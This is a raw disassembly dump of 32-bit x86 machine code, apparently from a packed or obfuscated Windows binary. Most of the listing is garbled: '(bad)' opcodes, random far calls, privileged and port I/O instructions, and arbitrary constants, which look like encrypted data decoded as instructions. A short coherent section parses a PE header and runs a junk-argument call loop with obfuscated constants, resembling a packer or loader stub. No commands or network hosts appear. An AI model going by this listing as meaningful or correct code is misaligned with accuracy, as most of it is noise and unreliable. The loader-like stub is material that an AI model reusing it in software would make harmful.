  409bce:	lods   eax,DWORD PTR ds:[esi]
  409bcf:	inc    edx
  409bd0:	mov    DWORD PTR [esi+esi*4+0x6356fc8d],ecx
  409bd7:	and    esi,DWORD PTR [esi+ecx*4]
  409bda:	sbb    eax,0xa788c995
  409bdf:	(bad)  
  409be0:	iret   
  409be1:	fst    DWORD PTR [edx]
  409be3:	xor    esp,DWORD PTR [ebp+0x66]
  409be6:	push   0x35
  409be8:	xchg   ebx,eax
  409be9:	xor    al,0xeb
  409beb:	fist   WORD PTR [ecx-0x30]
  409bee:	loopne 0x409bfb
  409bf0:	mov    WORD PTR [ecx],gs
  409bf2:	or     BYTE PTR [ebp+0x78432143],ah
  409bf8:	sub    eax,0x1d057588
  409bfd:	test   al,0x24
  409bff:	pop    esi
  409c00:	sbb    DWORD PTR [edi+ebx*8],eax
  409c03:	rcr    ebp,cl
  409c05:	push   ebx
  409c06:	ins    DWORD PTR es:[edi],dx
  409c07:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409c08:	pop    es
  409c09:	dec    ecx
  409c0a:	sub    BYTE PTR [ebx],ch
  409c0c:	xchg   edx,eax
  409c0d:	mov    DWORD PTR ds:0xb49acb88,esi
  409c13:	push   cs
  409c14:	pop    ebp
  409c15:	fldcw  WORD PTR [ebp+ecx*2-0x33306ae2]
  409c1c:	mov    es,WORD PTR [esi]
  409c1e:	adc    edx,0x3a
  409c21:	retf   
  409c22:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409c23:	icebp  
  409c24:	data16 (bad) 
  409c26:	sbb    eax,0x9384189a
  409c2b:	fwait
  409c2c:	dec    eax
  409c2d:	add    BYTE PTR [edi+0x546a55b4],0xc3
  409c34:	bound  esp,QWORD PTR [eax+ecx*2-0x4d]
  409c38:	dec    ebp
  409c39:	pusha  
  409c3a:	aam    0x1a
  409c3c:	xor    DWORD PTR [esi+0x2f],esi
  409c3f:	bnd fs jbe 0x409c0a
  409c43:	and    ax,bp
  409c46:	inc    cl
  409c48:	lea    ecx,[edx]
  409c4a:	popf   
  409c4b:	lds    esp,FWORD PTR [ecx+0x78f1fa1c]
  409c51:	and    DWORD PTR [ecx-0x4a],0xe9698fb3
  409c58:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409c59:	cdq    
  409c5a:	repnz cmp DWORD PTR [ebp-0x1864038d],edi
  409c61:	inc    ebp
  409c62:	push   ebp
  409c63:	gs (bad) 
  409c66:	call   0x8cbc:0xdaaaca36
  409c6d:	mov    eax,0xe7c8e0d6
  409c73:	ret    
  409c74:	jae    0x409c13
  409c76:	fiadd  DWORD PTR [edi+0x7f0cb32]
  409c7c:	xor    eax,0xe544cdee
  409c81:	call   0xb9bdd81b
  409c86:	xor    eax,0x8f917c14
  409c8b:	adc    ebp,DWORD PTR [ebp-0x24]
  409c8e:	pushf  
  409c8f:	or     BYTE PTR [eax+ecx*8-0x34],0x5b
  409c94:	or     eax,0x7a71845c
  409c99:	and    al,0x4
  409c9b:	int    0x9f
  409c9d:	sub    al,0x58
  409c9f:	jnp    0x409d1d
  409ca1:	cs push esi
  409ca3:	and    DWORD PTR [edx+0x1a158100],ecx
  409ca9:	xor    al,0x41
  409cab:	add    BYTE PTR [eax+0x4004427],bh
  409cb1:	xor    eax,0x66e94934
  409cb6:	add    DWORD PTR [eax],eax
  409cb8:	add    BYTE PTR [ecx],al
  409cba:	bound  esp,QWORD PTR [eax-0x13]
  409cbd:	arpl   bp,bp
  409cbf:	cdq    
  409cc0:	jp     0x409c53
  409cc2:	fldenv [esi+ebx*2+0x6cd08391]
  409cc9:	mov    cl,0xc0
  409ccb:	jl     0x409d49
  409ccd:	retf   0x7c7f
  409cd0:	jl     0x409c5e
  409cd2:	jg     0x409d11
  409cd4:	imul   edx,DWORD PTR [ecx],0x76064e44
  409cda:	or     dl,BYTE PTR [ecx+0x74a2217]
  409ce0:	data16 sbb dh,BYTE PTR [edi-0x59c1de3a]
  409ce7:	xor    al,0xe9
  409ce9:	popf   
  409cea:	stos   BYTE PTR es:[edi],al
  409ceb:	xlat   BYTE PTR ds:[ebx]
  409cec:	sbb    DWORD PTR [edx-0x268d4b79],esi
  409cf2:	shl    BYTE PTR [esi],0x25
  409cf5:	scas   al,BYTE PTR es:[edi]
  409cf6:	lods   eax,DWORD PTR ds:[esi]
  409cf7:	sub    esi,DWORD PTR [ebx-0x55]
  409cfa:	adc    DWORD PTR [ebp+0xe],edi
  409cfd:	xor    eax,0x1c1e71a9
  409d02:	in     al,0x2c
  409d04:	and    DWORD PTR [eax+0x17],ebx
  409d07:	jmp    0xeb5e:0x8c07142d
  409d0e:	mov    cl,BYTE PTR [edx+eax*8+0xa]
  409d12:	mov    ah,0x31
  409d14:	sbb    al,0x3c
  409d16:	push   esi
  409d17:	lahf   
  409d18:	sub    DWORD PTR [ecx],ebp
  409d1a:	or     DWORD PTR [ecx],ebx
  409d1c:	xchg   ecx,eax
  409d1d:	(bad)  
  409d1f:	xor    eax,0x1e101310
  409d24:	add    BYTE PTR [edx+0x220d210a],dl
  409d2a:	pop    ebx
  409d2b:	aad    0x77
  409d2d:	mov    eax,0xe4f6d492
  409d32:	sbb    ah,0x9c
  409d35:	fbld   TBYTE PTR [esi+0x2d]
  409d38:	mov    ah,0x3
  409d3a:	enter  0xe604,0x9c
  409d3e:	pusha  
  409d3f:	ds jns 0x409d2d
  409d42:	xor    bh,BYTE PTR [edx]
  409d44:	fs inc edi
  409d46:	jnp    0x409d80
  409d48:	sub    eax,0xf30a1af1
  409d4d:	cld    
  409d4e:	dec    ebx
  409d4f:	pop    esp
  409d50:	dec    edi
  409d51:	mov    dh,0xa6
  409d53:	cli    
  409d54:	xchg   BYTE PTR [ecx-0x21],bh
  409d57:	push   0xfffffffd
  409d59:	outs   dx,DWORD PTR ds:[esi]
  409d5a:	jo     0x409da6
  409d5c:	int3   
  409d5d:	pop    esp
  409d5e:	popa   
  409d5f:	outs   dx,DWORD PTR ds:[esi]
  409d60:	ret    
  409d61:	ficomp DWORD PTR [edx-0x47]
  409d64:	sub    BYTE PTR fs:[esp+ecx*1],bh
  409d68:	or     al,0x19
  409d6a:	adc    BYTE PTR [esi],0xce
  409d6d:	in     al,0x59
  409d6f:	mov    ecx,0x532899d0
  409d74:	inc    edx
  409d75:	outs   dx,BYTE PTR ds:[esi]
  409d76:	ror    DWORD PTR [eax-0x6c],1
  409d79:	push   ss
  409d7a:	inc    ecx
  409d7b:	or     eax,0x9a6d5489
  409d80:	xchg   ebp,eax
  409d81:	(bad)  
  409d82:	in     al,dx
  409d83:	sbb    eax,0x993944c5
  409d88:	fdivr  DWORD PTR [edx]
  409d8a:	xchg   esi,eax
  409d8b:	adc    BYTE PTR [esi+0x5b531d05],cl
  409d91:	jno    0x409d32
  409d93:	xchg   esi,eax
  409d94:	sahf   
  409d95:	int    0x4c
  409d97:	mov    ah,0xd7
  409d99:	iret   
  409d9a:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409d9c:	pushf  
  409d9d:	mov    ebp,0x38949ffd
  409da2:	retf   0x1ddf
  409da5:	lds    edx,FWORD PTR [ebx-0x2f]
  409da8:	jb     0x409dcf
  409daa:	cmp    al,0x3c
  409dac:	inc    esp
  409dad:	mov    eax,ds:0x4032fb1b
  409db2:	mov    ecx,0x9418dacd
  409db7:	iret   
  409db8:	xchg   DWORD PTR [ecx+0x59aa615c],eax
  409dbe:	or     BYTE PTR [edx+0x3b71b10c],bh
  409dc4:	push   ss
  409dc5:	jns    0x409de4
  409dc7:	call   DWORD PTR [edi-0x74]
  409dca:	jb     0x409db5
  409dcc:	out    0x4a,eax
  409dce:	gs or  al,0x59
  409dd1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409dd2:	pop    eax
  409dd3:	pop    edx
  409dd4:	bound  esp,QWORD PTR [edx-0x78fc7e68]
  409dda:	sahf   
  409ddb:	xchg   esp,eax
  409ddc:	mov    bh,0x6a
  409dde:	jecxz  0x409d73
  409de0:	dec    ebx
  409de1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409de2:	cmp    edx,edx
  409de4:	xchg   edx,eax
  409de5:	imul   ebp,ecx,0x5
  409de8:	jl     0x409e26
  409dea:	jge    0x409daf
  409dec:	push   edi
  409ded:	enter  0xef64,0x86
  409df1:	rcl    BYTE PTR [eax],0xb8
  409df4:	fstp   st(4)
  409df6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409df7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409df8:	dec    ecx
  409df9:	xchg   ebp,eax
  409dfa:	ror    eax,1
  409dfc:	cmp    ebp,edx
  409dfe:	scas   al,BYTE PTR es:[edi]
  409dff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409e00:	fcom   DWORD PTR [ecx+ecx*1+0x7d]
  409e04:	ror    DWORD PTR [ebx],1
  409e06:	imul   BYTE PTR [ebx+0x37]
  409e09:	shr    BYTE PTR [esi-0x1490e405],1
  409e0f:	xor    eax,0x3d18f64d
  409e14:	sbb    eax,0x7cb9c867
  409e19:	or     al,0x23
  409e1b:	popf   
  409e1c:	int    0x7e
  409e1e:	adc    bh,BYTE PTR [ebx+ecx*8]
  409e21:	mov    DWORD PTR ds:0x413402,0x71b7
  409e2b:	jne    0x40a324
  409e31:	or     DWORD PTR ds:0x4105d7,edx
  409e37:	mov    eax,DWORD PTR [ebp+0x8]
  409e3a:	mov    ecx,DWORD PTR [ebp+0x8]
  409e3d:	adc    DWORD PTR ds:0x43fbe0,0x48d6
  409e47:	add    ecx,DWORD PTR [eax+0x3c]
  409e4a:	mov    edx,DWORD PTR ds:0x43c8f4
  409e50:	xor    eax,eax
  409e52:	or     eax,DWORD PTR ds:0x43c900
  409e58:	sub    eax,edx
  409e5a:	and    edx,DWORD PTR [edx+eax*1]
  409e5d:	mov    edx,0x7510857
  409e62:	mov    DWORD PTR ds:0x4105c3,0x1d
  409e6c:	cmp    DWORD PTR ds:0x4105c3,0x0
  409e73:	je     0x409eb2
  409e79:	cmp    DWORD PTR ds:0x4105c3,0x2c
  409e80:	jne    0x409ea2
  409e86:	push   DWORD PTR [ebp-0x1c]
  409e89:	push   DWORD PTR [ebp-0x28]
  409e8c:	push   DWORD PTR [ebp-0x10]
  409e8f:	push   0x1f6d
  409e94:	push   0x61b1
  409e99:	push   DWORD PTR [ebp-0x14]
  409e9c:	call   DWORD PTR ds:0x43c524
  409ea2:	mov    eax,ds:0x4105c3
  409ea7:	dec    eax
  409ea8:	mov    ds:0x4105c3,eax
  409ead:	jmp    0x409e6c
  409eb2:	mov    DWORD PTR [ebp+0x8],ecx
  409eb5:	mov    eax,DWORD PTR [ebp-0x4]
  409eb8:	xor    eax,edx
  409eba:	push   esi
  409ebb:	mov    esi,DWORD PTR [ebp+0x8]
  409ebe:	mov    ecx,0x32729e
  409ec3:	add    eax,ecx
  409ec5:	cmp    DWORD PTR [esi+0x54],eax
  409ec8:	jmp    0x40a033
  409ecd:	mov    esi,0x45a9bf40
  409ed2:	mov    ebp,0xfb297b56
  409ed7:	test   BYTE PTR [esi+0x7a21133e],bl
  409edd:	cmpps  xmm7,XMMWORD PTR [esp+edi*2-0x36],0x7f
  409ee3:	jl     0x409f61
  409ee5:	mov    dl,0x7
  409ee7:	adc    eax,0xf8eac105
  409eec:	sbb    BYTE PTR [edi+0x5],ch
  409eef:	ja     0x409ead
  409ef1:	pop    ebx
  409ef2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409ef3:	js     0x409f59
  409ef5:	or     al,0x68
  409ef7:	inc    ebp
  409ef8:	push   ss
  409ef9:	call   0xa136:0xc4c2aafd
  409f00:	push   ebp
  409f01:	add    BYTE PTR [edx+0x6789ccfe],bl
  409f07:	xor    DWORD PTR [ecx+0x1d19a0],0x5c
  409f0e:	push   es
  409f0f:	arpl   WORD PTR [eax-0x23294758],di
  409f15:	std    
  409f16:	sbb    bl,BYTE PTR [ebp+0x4e0d63eb]
  409f1c:	loopne 0x409edd
  409f1e:	add    dl,cl
  409f20:	sbb    BYTE PTR [edi-0x59],cl
  409f23:	test   eax,0xc29419b0
  409f28:	xor    eax,0xa315c538
  409f2d:	test   BYTE PTR [ebp-0x2b],0x56
  409f31:	icebp  
  409f32:	pop    ss
  409f33:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409f34:	adc    edi,DWORD PTR [esi]
  409f36:	fs cwde 
  409f38:	stos   DWORD PTR es:[edi],eax
  409f39:	and    BYTE PTR [ebx-0x7e],bh
  409f3c:	ret    0xc9d3
  409f3f:	sbb    al,0xd0
  409f41:	sbb    DWORD PTR [edx+0x35],ebp
  409f44:	pop    eax
  409f45:	sub    al,0xae
  409f47:	les    eax,FWORD PTR [edx]
  409f49:	jno    0x409f12
  409f4b:	jae    0x409fa7
  409f4d:	inc    esi
  409f4e:	imul   eax,DWORD PTR [ebx-0x242e54b8],0xb5f08678
  409f58:	test   BYTE PTR [ebx+0x4c],cl
  409f5b:	cmp    eax,0x18cbc3b2
  409f60:	push   DWORD PTR [ebx]
  409f62:	add    BYTE PTR [ebx],dh
  409f64:	push   es
  409f65:	xchg   edx,eax
  409f66:	pop    ss
  409f67:	cmp    DWORD PTR [edx-0x4a],esi
  409f6a:	dec    ebx
  409f6b:	movmskps edi,xmm0
  409f6e:	stos   DWORD PTR es:[edi],eax
  409f6f:	xor    DWORD PTR [edi-0x6b40a8f],ebx
  409f75:	jo     0x409fb3
  409f77:	jno    0x409f0a
  409f79:	mov    ds:0xeb320d4,al
  409f7e:	xor    eax,DWORD PTR [ecx]
  409f80:	(bad)  
  409f81:	lea    edi,[eax]
  409f83:	add    esi,DWORD PTR ds:0x35653024
  409f89:	adc    ebp,DWORD PTR [esi+0x21]
  409f8c:	ins    BYTE PTR es:[edi],dx
  409f8d:	mov    WORD PTR [edi+0x10c8253b],?
  409f93:	out    dx,al
  409f94:	mov    esp,ss
  409f96:	jbe    0x409fcb
  409f98:	stc    
  409f99:	or     DWORD PTR [eax+0x36a18565],0x4b
  409fa0:	scas   eax,DWORD PTR es:[edi]
  409fa1:	sbb    eax,0xe53fe543
  409fa6:	and    esp,0xffffffb5
  409fa9:	mov    BYTE PTR [ebx+0x79d96f9b],dl
  409faf:	xchg   edi,eax
  409fb0:	push   ebp
  409fb1:	inc    esi
  409fb2:	and    al,0x41
  409fb4:	jmp    0x3e5ecf5f
  409fb9:	push   ebx
  409fba:	js     0x409fd3
  409fbc:	push   edx
  409fbd:	or     eax,0xbd0018a0
  409fc2:	scas   eax,DWORD PTR es:[di]
  409fc4:	mov    ds:0x152e69cd,al
  409fc9:	xor    DWORD PTR [edi+0x47704bba],edx
  409fcf:	pop    es
  409fd0:	xchg   DWORD PTR [ebx],ebp
  409fd2:	(bad)  
  409fd3:	mov    edx,0xc00c427f
  409fd8:	inc    edi
  409fd9:	mov    ?,WORD PTR [eax+0x78]
  409fdc:	sti    
  409fdd:	repz bound esp,QWORD PTR [eax+edx*4+0xbc93b46]
  409fe5:	mov    bh,0x3e
  409fe7:	xchg   ebp,eax
  409fe8:	xor    al,0xf5
  409fea:	mov    ds:0xf6247490,al
  409fef:	dec    esp
  409ff0:	cmp    DWORD PTR [ecx-0x4a2cd5bb],0x2c4a3471
  409ffa:	call   0x9ec1:0x8361a004
  40a001:	fnstsw WORD PTR [edx-0x16]
  40a004:	mov    esp,eax
  40a006:	call   0x8347:0x2b3507a8
  40a00d:	std    
  40a00e:	inc    esi
  40a00f:	push   ebx
  40a010:	dec    ebx
  40a011:	push   0xffffffd5
  40a013:	cs jle 0x40a08f
  40a016:	xchg   DWORD PTR [ecx],ebx
  40a018:	add    al,0xdc
  40a01a:	xchg   ebx,eax
  40a01b:	pop    es
  40a01c:	add    edi,DWORD PTR [ecx-0x16557f0f]
  40a022:	mov    dl,0xa6
  40a024:	jns    0x40a044
  40a026:	mov    edx,0x7cf6400
  40a02b:	dec    eax
  40a02c:	jecxz  0x40a02b
  40a02e:	and    ecx,esi
  40a030:	cdq    
  40a031:	stc    
  40a032:	sbb    DWORD PTR [esi+0xf],0xffffff84
  40a036:	jae    0x40a039
  40a038:	add    BYTE PTR [eax],al
  40a03a:	mov    eax,DWORD PTR [ebp+0x8]
  40a03d:	jmp    0x40a331
  40a042:	jmp    0x40a1ad
  40a047:	xchg   ecx,eax
  40a048:	test   dh,dl
  40a04a:	loopne 0x40a045
  40a04c:	bound  edi,QWORD PTR [ebp+0x7db7845d]
  40a052:	add    DWORD PTR ds:0xdd938e83,edi
  40a058:	lds    edi,FWORD PTR [esp+edi*2-0x36]
  40a05c:	jg     0x40a0da
  40a05e:	jl     0x40a0be
  40a060:	adc    cl,bl
  40a062:	fdivrp st(6),st
  40a064:	push   edi
  40a065:	and    ecx,DWORD PTR [ecx-0x10b67db1]
  40a06b:	or     eax,0x4efeae4c
  40a070:	or     cl,ch
  40a072:	div    dl
  40a074:	shr    BYTE PTR [edi-0x11],0x23
  40a078:	add    eax,0x9c8eea90
  40a07d:	and    DWORD PTR [ebp-0xb],ebp
  40a080:	je     0x40a053
  40a082:	lahf   
  40a083:	mov    bl,0x70
  40a085:	pop    ebx
  40a086:	xchg   ecx,eax
  40a087:	sub    ecx,DWORD PTR [eax+0x184a03c0]
  40a08d:	imul   BYTE PTR [ebx+0x3ec1126e]
  40a093:	inc    esi
  40a094:	sub    BYTE PTR [edi],dh
  40a096:	jl     0x40a03d
  40a098:	jne    0x40a0d8
  40a09a:	rcr    ah,0x96
  40a09d:	scas   eax,DWORD PTR es:[edi]
  40a09e:	adc    dh,bl
  40a0a0:	fstp   st(1)
  40a0a2:	aaa    
  40a0a3:	pop    ebx
  40a0a4:	stos   DWORD PTR es:[edi],eax
  40a0a5:	mov    ch,dl
  40a0a7:	(bad)  [edi+0x1e]
  40a0aa:	int    0xe6
  40a0ac:	jo     0x40a12a
  40a0ae:	cmp    cl,BYTE PTR [eax+0xc]
  40a0b1:	imul   ecx,edi,0xffffff8b
  40a0b4:	lods   al,BYTE PTR ds:[esi]
  40a0b5:	scas   eax,DWORD PTR es:[edi]
  40a0b6:	jle    0x40a052
  40a0b8:	jp     0x40a08a
  40a0ba:	jle    0x40a069
  40a0bc:	dec    esp
  40a0bd:	adc    al,0xe
  40a0bf:	mov    ebp,0xcffc8f61
  40a0c5:	mov    esi,DWORD PTR [esi+0x70]
  40a0c8:	ret    0xbe09
  40a0cb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a0cc:	das    
  40a0cd:	lods   al,BYTE PTR ds:[esi]
  40a0ce:	fcom   st(0)
  40a0d0:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a0d2:	cmp    DWORD PTR ds:0xd685bcab,0xd5ddf7da
  40a0dc:	das    
  40a0dd:	dec    edx
  40a0de:	cli    
  40a0df:	adc    cl,BYTE PTR [ebx]
  40a0e1:	inc    edx
  40a0e2:	loop   0x40a072
  40a0e4:	pop    eax
  40a0e5:	mov    BYTE PTR [ebx-0x2d762279],ah
  40a0eb:	(bad)  [ebp+0x501834c1]
  40a0f1:	stc    
  40a0f2:	mov    ecx,DWORD PTR [ecx-0x552e848d]
  40a0f8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a0f9:	or     al,0xe5
  40a0fb:	cmp    eax,0x38ff348e
  40a100:	push   ds
  40a101:	adc    al,0x3e
  40a103:	cmc    
  40a104:	or     edx,DWORD PTR [eax+0x68c6f5f4]
  40a10a:	retf   
  40a10b:	js     0x40a101
  40a10d:	repnz scas al,BYTE PTR es:[edi]
  40a10f:	das    
  40a110:	xchg   BYTE PTR [edi],dh
  40a112:	lods   al,BYTE PTR ds:[esi]
  40a113:	bound  eax,QWORD PTR [ebx+0x7a]
  40a116:	outs   dx,BYTE PTR ds:[esi]
  40a117:	rol    dl,cl
  40a119:	push   0xffffff94
  40a11b:	sbb    esi,0xffffffd2
  40a11e:	cld    
  40a11f:	js     0x40a19c
  40a121:	iret   
  40a122:	out    dx,eax
  40a123:	add    eax,DWORD PTR [edx]
  40a125:	mov    bl,0x1b
  40a127:	mov    WORD PTR [esi],fs
  40a129:	imul   ebp,DWORD PTR [edi-0x42],0xffffff84
  40a12d:	mov    ch,BYTE PTR [ebx-0x1ab4fd51]
  40a133:	mov    dh,0x22
  40a135:	jp     0x40a138
  40a137:	inc    edx
  40a138:	xlat   BYTE PTR ds:[ebx]
  40a139:	mov    bl,0xac
  40a13b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a13c:	adc    BYTE PTR [ebx],al
  40a13e:	or     BYTE PTR [ebp+ebx*8-0x25],0x0
  40a143:	es push edx
  40a145:	adc    esi,ebx
  40a147:	and    al,BYTE PTR es:[ebp-0x3ca6edd5]
  40a14e:	mov    eax,0x7b363fd3
  40a153:	xor    al,0xf0
  40a155:	imul   esp,DWORD PTR [eax-0x80],0x55247909
  40a15c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a15d:	push   0xffffffa3
  40a15f:	mov    ch,0x3e
  40a161:	mov    dl,0x82
  40a163:	outs   dx,DWORD PTR ds:[esi]
  40a164:	(bad)  
  40a165:	test   DWORD PTR [ebx],0x7fa56fdb
  40a16b:	fs stc 
  40a16d:	and    edx,DWORD PTR [esi]
  40a16f:	dec    edi
  40a170:	fst    DWORD PTR [edx+ebp*8]
  40a173:	sbb    ch,BYTE PTR [eax+0xcdc20af]
  40a179:	pop    edi
  40a17a:	fcmovu st,st(1)
  40a17c:	test   eax,0x62d5c3c8
  40a181:	das    
  40a182:	pop    eax
  40a183:	pop    ecx
  40a184:	inc    ebp
  40a185:	test   dl,ch
  40a187:	jb     0x40a162
  40a189:	adc    DWORD PTR [esi],0xffffffcf
  40a18c:	cs stc 
  40a18e:	cmp    dl,BYTE PTR [esp+esi*8-0x26]
  40a192:	mov    eax,0x35f552d1
  40a197:	cld    
  40a198:	lods   eax,DWORD PTR ds:[esi]
  40a199:	jmp    0xeebf:0x73ab6a6e
  40a1a0:	in     eax,0x2
  40a1a2:	jmp    0xc59f:0x6550856d
  40a1a9:	sub    eax,0x8bebd77c
  40a1ae:	inc    ebp
  40a1af:	cld    
  40a1b0:	jmp    0x40a31b
  40a1b5:	aam    0x68
  40a1b7:	rol    BYTE PTR [eax+0x50],1
  40a1ba:	pop    eax
  40a1bb:	fs js  0x40a15e
  40a1be:	jge    0x40a14e
  40a1c0:	fisubr WORD PTR [edx-0x70]
  40a1c3:	inc    ebp
  40a1c4:	jl     0x40a171
  40a1c6:	les    edi,FWORD PTR [esp+edi*2-0x36]
  40a1ca:	jg     0x40a248
  40a1cc:	jl     0x40a15a
  40a1ce:	push   ebx
  40a1cf:	mov    ah,0xa0
  40a1d1:	cmp    BYTE PTR [ebp-0x240f3fe5],bh
  40a1d7:	mov    ds:0xd80f85df,al
  40a1dc:	clc    
  40a1dd:	jno    0x40a217
  40a1df:	or     al,0x2
  40a1e1:	inc    ecx
  40a1e2:	and    bl,ch
  40a1e4:	mov    al,0x5e
  40a1e6:	fld    DWORD PTR [edx]
  40a1e8:	sbb    eax,0x5e90fa6e
  40a1ed:	lods   al,BYTE PTR ds:[esi]
  40a1ee:	and    eax,0x445ae83e
  40a1f3:	je     0x40a269
  40a1f5:	jmp    0x37ba0022
  40a1fa:	push   ds
  40a1fb:	sub    dl,0xf9
  40a1fe:	jns    0x40a1f0
  40a200:	shl    DWORD PTR [edx-0x6242ea5f],1
  40a206:	call   0x2537:0x8141d32e
  40a20d:	pushf  
  40a20e:	add    BYTE PTR [esi+0x7f],cl
  40a211:	cli    
  40a212:	cmc    
  40a213:	push   es
  40a214:	into   
  40a215:	out    0x8d,eax
  40a217:	sbb    al,0x89
  40a219:	sub    BYTE PTR [ebp+0x44e0c874],ah
  40a21f:	pop    esi
  40a220:	daa    
  40a221:	inc    esp
  40a222:	shl    BYTE PTR [edi-0x4e],0xfd
  40a226:	adc    ch,BYTE PTR [esi-0x7c194227]
  40a22c:	ins    DWORD PTR es:[edi],dx
  40a22d:	inc    eax
  40a22e:	cwde   
  40a22f:	stos   BYTE PTR es:[edi],al
  40a230:	mov    ebp,DWORD PTR [ebp-0x31]
  40a233:	xchg   esp,eax
  40a234:	mov    dl,0x23
  40a236:	dec    eax
  40a237:	and    al,0x49
  40a239:	mov    cl,0xb8
  40a23b:	xlat   BYTE PTR ds:[ebx]
  40a23c:	push   ebx
  40a23d:	xor    DWORD PTR [ecx],ebx
  40a23f:	and    BYTE PTR [edx],al
  40a241:	xchg   esi,eax
  40a242:	xor    al,0xa
  40a244:	push   fs
  40a246:	mov    eax,ds:0xcc417d51
  40a24b:	push   edx
  40a24c:	xchg   ebx,eax
  40a24d:	and    edx,edx
  40a24f:	cwde   
  40a250:	sub    ah,BYTE PTR [edi+0x33]
  40a253:	sahf   
  40a254:	jnp    0x40a23a
  40a256:	outs   dx,BYTE PTR ds:[esi]
  40a257:	push   ebp
  40a258:	pop    ebp
  40a259:	xchg   edx,eax
  40a25a:	test   al,0xd4
  40a25c:	sar    BYTE PTR [ebp-0x33],0x54
  40a260:	cli    
  40a261:	sub    dl,BYTE PTR [edx-0x774dfeaf]
  40a267:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a268:	out    dx,eax
  40a269:	cli    
  40a26a:	fisubr WORD PTR [esi-0x4f]
  40a26d:	mov    dh,0x5d
  40a26f:	fisttp WORD PTR ds:0xcdebe83e
  40a275:	dec    esp
  40a276:	bswap  edx
  40a278:	loop   0x40a2e8
  40a27a:	sti    
  40a27b:	or     DWORD PTR [ecx-0x5d],0xffffffbd
  40a27f:	shr    BYTE PTR [eax-0x6b],0x7c
  40a283:	adc    ch,BYTE PTR [ebp+0x5d5d3056]
  40a289:	xlat   BYTE PTR ds:[ebx]
  40a28a:	popf   
  40a28b:	mov    ch,0xd1
  40a28d:	adc    edx,DWORD PTR [esi+0x23]
  40a290:	dec    DWORD PTR [ecx+0x6cb5174b]
  40a296:	pop    ebp
  40a297:	cmp    DWORD PTR [ebp+0x13],esi
  40a29a:	dec    edi
  40a29b:	(bad)  
  40a29d:	mov    BYTE PTR [edi+edx*2-0x5fa5ccce],dh
  40a2a4:	ss sub al,0xb9
  40a2a7:	scas   al,BYTE PTR es:[edi]
  40a2a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a2a9:	mov    ebp,0x5a00162c
  40a2ae:	pop    ebx
  40a2af:	add    DWORD PTR [ecx-0x38],eax
  40a2b2:	hlt    
  40a2b3:	push   ebx
  40a2b4:	jb     0x40a26b
  40a2b6:	and    DWORD PTR [edx-0x4c7433a],0xbe1ec0ed
  40a2c0:	(bad)  
  40a2c1:	sbb    esp,edx
  40a2c3:	rcl    bh,0x8e
  40a2c6:	fst    QWORD PTR [ecx-0x5ba6bf90]
  40a2cc:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  40a2ce:	mov    eax,ds:0xc370d45f
  40a2d3:	gs xchg cx,ax
  40a2d6:	or     BYTE PTR cs:[edx+eiz*8],cl
  40a2da:	scas   al,BYTE PTR es:[edi]
  40a2db:	ss sbb al,0x31
  40a2de:	push   esi
  40a2df:	mov    esi,0xa3de7740
  40a2e4:	dec    ecx
  40a2e5:	push   es
  40a2e6:	scas   eax,DWORD PTR es:[edi]
  40a2e7:	repz push 0x19135f58
  40a2ed:	xchg   ebx,eax
  40a2ee:	sbb    BYTE PTR [esp],cl
  40a2f1:	cmp    edx,DWORD PTR [edx]
  40a2f3:	sub    bl,BYTE PTR [edi]
  40a2f5:	das    
  40a2f6:	xor    edi,edi
  40a2f8:	jl     0x40a285
  40a2fa:	mov    DWORD PTR [ebp*4-0x2915f054],ebx
  40a301:	ficom  DWORD PTR [edi+0x34d41f95]
  40a307:	jl     0x40a2b6
  40a309:	es adc esp,ebp
  40a30c:	ret    
  40a30d:	push   ecx
  40a30e:	idiv   BYTE PTR [eax+0xbafaec3]
  40a314:	or     ch,BYTE PTR [esp+ecx*8]
  40a317:	inc    esp
  40a318:	sub    bl,BYTE PTR [eax]
  40a31a:	add    eax,0xc103c233
  40a31f:	jmp    0x40a331
  40a324:	mov    eax,DWORD PTR [ebp-0x4]
  40a327:	xor    eax,0x7510857
  40a32c:	add    eax,0x32729e
  40a331:	leave  
  40a332:	ret    0x4
  40a335:	dec    ebp
  40a336:	push   ebp
  40a337:	mov    DWORD PTR [ebx-0x7e9d13f8],ecx
  40a33d:	mov    esp,ebp
  40a33f:	or     ah,dh
  40a341:	dec    ebp
  40a342:	add    bh,al
  40a344:	add    BYTE PTR [eax],cl
  40a346:	add    BYTE PTR [eax],al
  40a348:	mov    DWORD PTR [eax],0x40f44545
  40a34e:	xor    eax,0x9c8b8500
  40a353:	hlt    
  40a354:	clc    
  40a355:	retf   
  40a356:	(bad)  
  40a357:	enter  0x4d45,0xbc
  40a35b:	mov    esi,DWORD PTR [esp+esi*8]
  40a35e:	test   ebx,ecx
  40a360:	pushf  
  40a361:	enter  0x4df8,0x8b
  40a365:	mov    DWORD PTR [ebp-0x20],0x890208
  40a36c:	inc    ebp
  40a36d:	inc    ebp
  40a36e:	cld    
  40a36f:	xor    cl,BYTE PTR [ebx-0xb38b300]
  40a375:	or     BYTE PTR [ebx+0x0],dl
  40a378:	mov    ebx,0x8bd5700
  40a37d:	call   DWORD PTR [ecx-0x1]
  40a380:	pop    es
  40a381:	mov    ch,0x33
  40a383:	dec    ebx
  40a385:	(bad)  
  40a386:	mov    eax,0x72009ea4
  40a38b:	push   DWORD PTR [edx]
  40a38d:	or     BYTE PTR [eax],al
  40a38f:	jmp    0xff89:0x75c84d03
  40a396:	dec    ebp
